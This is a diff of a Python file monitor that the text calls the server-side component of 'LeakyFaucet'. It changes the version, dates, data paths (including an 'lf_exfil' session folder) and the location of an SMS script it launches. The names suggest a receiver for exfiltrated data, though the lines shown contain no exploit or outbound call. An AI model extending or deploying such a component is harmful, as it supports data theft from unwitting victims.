@@ -1,6 +1,6 @@
-#LeakyFaucet Server Filemon v1.2.6
+#LeakyFaucet Server Filemon v1.3.0
 #Written: Mr. Waterhouse 
-#May 7, 2023
+#May 10, 2023
 #
 #This is script 2 of 4 required on the server side of LeakyFaucet.
 #
@@ -20,9 +20,9 @@ import re
 import subprocess
 
 # Path to the text file to watch, the folder for session logs, and the path containing addition command calls
-file_path = "/home/ubuntu/lf_data.txt"
-session_dir = "/home/ubuntu/lf_exfil/"
-commands_path = "/home/ubuntu/lf_commands/"
+file_path = "/home/ubuntu/lfdata/lf_data.txt"
+session_dir = "/home/ubuntu/lfdata/lf_exfil/"
+commands_path = "/home/ubuntu/lfcommands/"
 
 # Get the initial size of the file.
 file_size = os.path.getsize(file_path)
@@ -59,10 +59,10 @@ while True:
 
                 #Call SMS script
                 #phone_arg = new_line[:11] 
-                subprocess.Popen(["python3", "/home/ubuntu/lf_sms.py", phone_arg, sessionFile, "0"])
+                subprocess.Popen(["python3", "/usr/local/bin/lf_sms.py", phone_arg, sessionFile, "0"])
 
                 #Invoke a second SMS script in verify mode
-                subprocess.Popen(["python3", "/home/ubuntu/lf_sms.py", phone_arg, sessionFile, "1"])
+                subprocess.Popen(["python3", "/usr/local/bin/lf_sms.py", phone_arg, sessionFile, "1"])
 
     # Sleep for 1 second before checking again
     time.sleep(1)
